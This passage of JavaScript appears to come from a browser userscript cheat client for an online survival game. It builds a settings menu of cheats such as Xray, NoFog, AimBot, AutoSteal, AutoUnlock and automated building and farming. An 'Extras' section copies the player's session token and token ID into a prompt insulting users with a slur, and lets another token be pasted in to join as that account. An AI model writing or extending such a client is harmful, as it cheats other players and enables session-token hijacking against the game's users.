				label: "ShowJoinLeaves",
				object: Settings.ShowJoinLeaves,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "Roofs",
				object: Settings.Roofs,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ShowHP",
				object: Settings.ShowHP,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "Debugger",
				object: Settings.Debugger,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "Timers",
				object: Settings.Timers,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "WeatherInfo",
				object: Settings.WeatherInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ExtractorInfo",
				object: Settings.ExtractorInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ChestInfo",
				object: Settings.ChestInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "BoxInfo",
				object: Settings.BoxInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "WindmillInfo",
				object: Settings.WindmillInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "OvenInfo",
				object: Settings.OvenInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "TotemInfo",
				object: Settings.TotemInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "FurnaceInfo",
				object: Settings.FurnaceInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "MachineInfo",
				object: Settings.MachineInfo,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ColoredSpikes",
				object: Settings.ColoredSpikes,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ShowHoodNames",
				object: Settings.ShowHoodNames,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "NoFog",
				object: Settings.NoFog,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "Xray",
				object: Settings.Xray,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "range",
				label: "XrayOpacity",
				object: Settings,
				property: "XrayOpacity",
				min: .05,
				max: .95,
				step: .05,
				onChange() {
					saveSettings()
				}
			}, {
				type: "range",
				label: "RoofsOpacity",
				object: Settings,
				property: "RoofsOpacity",
				min: .05,
				max: .95,
				step: .05,
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "ColoredSpikes Textures",
				object: Settings.ColoredSpikes,
				property: "textures",
				options: ["1", "2"],
				onChange() {
					saveSettings();
					switchColoredSpikesTextures()
				}
			}], {
				folder: "Visuals"
			});
			gui.Register([
								{
					type: "checkbox",
					label: "AutoRespawn",
					object: Settings.AutoRespawn,
					property: "enabled",
					onChange() {
						saveSettings()
					}
				},
				{
					type: "checkbox",
					label: "Equip after place",
					object: Settings.Equip,
					property: "enabled",
					onChange() {
						saveSettings()
					}
				},
				{
				type: "checkbox",
				label: "AutoCraft",
				object: Settings.AutoCraft,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoRecycle",
				object: Settings.AutoRecycle,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoBook",
				object: Settings.AutoBook,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoTotem",
				object: Settings.AutoTotem,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoCrown",
				object: Settings.AutoCrown,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AimBot",
				object: Settings.AimBot,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoBuild",
				object: Settings.AutoBuild,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoSeed",
				object: Settings.AutoSeed,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoSeed with G",
				object: Settings,
				property: "AutoSeedG",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoFeed",
				object: Settings.AutoFeed,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoIce",
				object: Settings.AutoIce,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoBreadTake",
				object: Settings.AutoBreadTake,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoBreadPut",
				object: Settings.AutoBreadPut,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoExtractorTake",
				object: Settings.AutoExtractorTake,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoExtractorPut",
				object: Settings.AutoExtractorPut,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			},{
				type: "checkbox",
				label: "ZMA",
				object: Settings.ZMA,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			},{
				type: "checkbox",
				label: "crownHeal",
				object: Settings.crownHeal,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			},
			{
				type: "checkbox",
				label: "BottleHealZma",
				object: Settings.BottleHeal,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			},{
				type: "select",
				label: "AutoBuild Build",
				object: Settings.AutoBuild,
				property: "build",
				options: ["Roofs", "Bridges", "Plots"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSeed Seed",
				object: Settings.AutoSeed,
				property: "seed",
				options: ["Auto", "Berry", "Wheat", "Pumpkin", "Thornbush", "Aloe", "Watermelon", "Garlic", "Carrot", "Tomato"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "range",
				label: "PutInChest Amount",
				object: Settings,
				property: "PutInChest",
				min: 10,
				max: 8e3,
				step: 10,
				onChange() {
					saveSettings()
				}
			},], {
				folder: "Misc"
			});
			for (const property in Settings) {
				if (Settings[property].pushToBinds) {
					gui.Register([{
						type: "display",
						label: `${property} Key`,
						object: Settings[property],
						property: "key"
					}, {
						type: "button",
						label: `Set ${property} Key`,
						action() {
							setKeybind(property)
						}
					}], {
						folder: "Binds"
					})
				}
			}
			gui.Register([{
				type: "checkbox",
				label: "AutoSteal",
				object: Settings.AutoSteal,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoUnlock",
				object: Settings,
				property: "AutoUnlock",
				onChange() {
					saveSettings()
				}
			}, {
				type: "display",
				label: "AutoSteal Key",
				object: Settings.AutoSteal,
				property: "key"
			}, {
				type: "button",
				label: "Set AutoSteal Key",
				action() {
					setKeybind("AutoSteal")
				}
			}], {
				folder: "AutoSteal"
			});
			gui.Register([{
				type: "display",
				label: "AutoSpike Key",
				object: Settings.AutoSpike,
				property: "key"
			}, {
				type: "button",
				label: "Set AutoSpike Key",
				action() {
					setKeybind("AutoSpike")
				}
			}, {
				type: "checkbox",
				label: "AutoSpike 2",
				object: Settings.AutoSpike,
				property: "mode",
				onChange() {
					saveSettings()
				}
			}, {
				type: "display",
				label: "AutoWall Key",
				object: Settings.AutoWall,
				property: "key"
			}, {
				type: "button",
				label: "Set AutoWall Key",
				action() {
					setKeybind("AutoWall")
				}
			}, {
				type: "checkbox",
				label: "AutoWall 2",
				object: Settings.AutoWall,
				property: "mode",
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 1",
				object: Settings.AutoSpike.priority,
				property: "0",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 2",
				object: Settings.AutoSpike.priority,
				property: "1",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 3",
				object: Settings.AutoSpike.priority,
				property: "2",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 4",
				object: Settings.AutoSpike.priority,
				property: "3",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 5",
				object: Settings.AutoSpike.priority,
				property: "4",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 6",
				object: Settings.AutoSpike.priority,
				property: "5",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}, {
				type: "select",
				label: "AutoSpike Priority 7",
				object: Settings.AutoSpike.priority,
				property: "6",
				options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
				onChange() {
					saveSettings()
				}
			}], {
				folder: "AutoSpike"
			});
			gui.Register([{
				type: "checkbox",
				label: "SmartCraft",
				object: Settings.SmartCraft,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "display",
				label: "SmartCraft Key",
				object: Settings.SmartCraft,
				property: "key"
			}, {
				type: "button",
				label: "Set SmartCraft Key",
				action() {
					setKeybind("SmartCraft")
				}
			}, {
				type: "select",
				label: "SmartCraft Select",
				options: ["REIDITE_SPIKE", "AMETHYST_SPIKE", "DIAMOND_SPIKE", "GOLD_SPIKE", "STONE_SPIKE", "REIDITE_WALL", "AMETHYST_WALL", "DIAMOND_WALL", "GOLD_WALL", "STONE_WALL"],
				object: Settings.SmartCraft,
				property: "select",
				onChange() {
					saveSettings()
				}
			}, {
				type: "range",
				label: "CraftHowMuch",
				object: Settings.SmartCraft,
				property: "hm",
				min: 1,
				max: 500,
				step: 1,
				onChange() {
					saveSettings()
				}
			}], {
				folder: "SmartCraft"
			});
			gui.Register([{
				type: "checkbox",
				label: "Spectator",
				object: Settings.Spectator,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "range",
				label: "Spectator Speed",
				min: .05,
				step: .05,
				max: 1,
				object: Settings.Spectator,
				property: "speed",
				onChange() {
					saveSettings()
				}
			}, {
				type: "display",
				label: "Spectator Key",
				object: Settings.Spectator,
				property: "key"
			}, {
				type: "button",
				label: "Set Spectator Key",
				action() {
					setKeybind("Spectator")
				}
			}], {
				folder: "Spectator"
			});
			gui.Register([{
				type: "checkbox",
				label: "Start AutoFarm",
				object: Settings.AutoFarm,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "AutoWater",
				object: Settings.AutoFarm,
				property: "water",
				onChange() {
					saveSettings()
				}
			}, {
				type: "button",
				label: "Top left of farm",
				action() {
					getWorldProperty("fast_units")[getUserProperty("uid")] && (Settings.AutoFarm.x = getWorldProperty("fast_units")[getUserProperty("uid")].x, Settings.AutoFarm.y = getWorldProperty("fast_units")[getUserProperty("uid")].y);
					saveSettings()
				}
			}, {
				type: "button",
				label: "Bottom right of farm",
				action() {
					getWorldProperty("fast_units")[getUserProperty("uid")] && (Settings.AutoFarm.xx = getWorldProperty("fast_units")[getUserProperty("uid")].x, Settings.AutoFarm.yy = getWorldProperty("fast_units")[getUserProperty("uid")].y);
					saveSettings()
				}
			}, {
				type: "button",
				label: "Safe Point",
				action() {
					getWorldProperty("fast_units")[getUserProperty("uid")] && (Settings.AutoFarm.sx = getWorldProperty("fast_units")[getUserProperty("uid")].x, Settings.AutoFarm.sy = getWorldProperty("fast_units")[getUserProperty("uid")].y);
					saveSettings()
				}
			}, {
				type: "display",
				label: "X",
				object: Settings.AutoFarm,
				property: "x"
			}, {
				type: "display",
				label: "Y",
				object: Settings.AutoFarm,
				property: "y"
			}, {
				type: "display",
				label: "X1",
				object: Settings.AutoFarm,
				property: "xx"
			}, {
				type: "display",
				label: "Y1",
				object: Settings.AutoFarm,
				property: "yy"
			}, {
				type: "display",
				label: "SX",
				object: Settings.AutoFarm,
				property: "sx"
			}, {
				type: "display",
				label: "SY",
				object: Settings.AutoFarm,
				property: "sy"
			}], {
				folder: "AutoFarm"
			})
						gui.Register([ 
							{
				type: "range",
				label: "Skin",
				min: 0,
				max: 238,
				step: 1,
				object: Settings.Skin,
				property: "Skin",
				onChange: (data) => {
					getWorldProperty("fast_units")[getUserProperty("uid")].ⲆⵠⲆᐃ = data
				}
				},
				{
				type: "button",
				label: "Copy token",
				action() {
				let str = "```" + `Nickname: ${getWorldProperty("fast_units")[getUserProperty("uid")].ⵠΔⲆΔ.ⵠΔⵠⲆᐃ}\nToken: ${window.user.ᐃΔΔⲆⲆ}\nTokenID: ${window.user.ᐃΔⵠⲆᐃⵠⲆ}` + "```";
				window.prompt("Press CTRL C RETARDS", str)
				}
				},
				{
				type: "button",
				label: "Go To Lobby",
				action() {
					getClientProperty("steal_token") && getClientProperty("steal_token").bind(window.client)()
				}

				},
				{
							type: "checkbox",
							label: "Token Joiner Enabled",
							object: Settings.Tokens,
							property: "enabled",
							action() {
								saveSettings()
							}
						},
				{
				type: "text",
				label: "Token",
				object: Settings.Tokens,
				property: "token",
				listenMode: 'input',
				onChange: (data) => {
				window.user.ᐃΔΔⲆⲆ = data;
				saveSettings()
				}
				},
				{
				type: "text",
				label: "TokenID",
				object: Settings.Tokens,
				property: "tokenid",
				listenMode: 'input',
				onChange: (data) => {
				window.user.ᐃΔⵠⲆᐃⵠⲆ = data;
				saveSettings();
				}
				},
				], {
				folder: "Extras"
				})
		}

		const script = document.createElement("script");
		script.src = "https://unpkg.com/guify@0.12.0/lib/guify.min.js";
		script.onload = initExclusive;
		document.body.appendChild(script)
	})();
